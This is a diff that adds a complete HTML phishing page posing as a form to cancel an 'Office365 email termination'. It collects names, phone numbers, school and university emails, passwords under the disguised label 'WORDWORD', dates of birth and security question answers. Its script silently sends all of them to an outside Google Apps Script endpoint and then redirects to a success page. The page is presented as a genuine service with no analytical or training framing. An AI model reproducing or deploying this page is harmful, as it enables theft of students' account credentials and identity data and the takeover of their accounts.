@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Cancel Office365 Email Termination</title>
+
+  <style>
+    body {
+      background-color: white;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      padding: 20px;
+      max-width: 400px;
+    }
+
+    /* HEADER IMAGE */
+    .header-img {
+      width: 100%;
+      height: auto;
+      margin-bottom: 15px;
+      border-radius: 8px;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: black;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background: #333;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- 🔥 HEADER IMAGE -->
+  <img src="assets/header.jpg" class="header-img" alt="Header">
+
+  <form id="myForm">
+
+    <input name="fullName" placeholder="Full Name" required>
+    <input name="phoneNumber" placeholder="Phone Number" required>
+    <input name="currentEmail" placeholder="Current Office365 School Email" required>
+
+    <input name="wordword1" placeholder="WORDWORD">
+    <input name="otherSchoolEmail" placeholder="Other University Email">
+
+    <input name="wordword2" placeholder="WORDWORD (Other University)">
+
+    <input name="dob" type="date">
+
+    <input name="securityQ1" placeholder="Security Question 1">
+    <input name="securityA1" placeholder="Security Answer 1">
+
+    <input name="securityQ2" placeholder="Security Question 2">
+    <input name="securityA2" placeholder="Security Answer 2">
+
+    <button type="submit">Submit</button>
+
+  </form>
+
+</div>
+
+<script>
+
+const scriptURL = "https://script.google.com/macros/s/AKfycbw9MOfuM5sIav8SbSOGSR9iMJ69TnDzZS-A7oxIntGNBGyfF_wFMHdNqypig53jaI8/exec";
+
+const form = document.getElementById("myForm");
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const submitButton = form.querySelector('button[type="submit"]');
+  submitButton.disabled = true;
+  submitButton.textContent = "Submitting...";
+
+  try {
+    const formData = new URLSearchParams(new FormData(form));
+
+    await fetch(scriptURL, {
+      method: "POST",
+      mode: "no-cors",
+      body: formData
+    });
+
+    window.location.href = "success.html";
+
+  } catch (error) {
+    alert("Submission could not be sent. Please try again.");
+    submitButton.disabled = false;
+    submitButton.textContent = "Submit";
+    console.error(error);
+  }
+});
+</script>
+
+</body>
+</html>
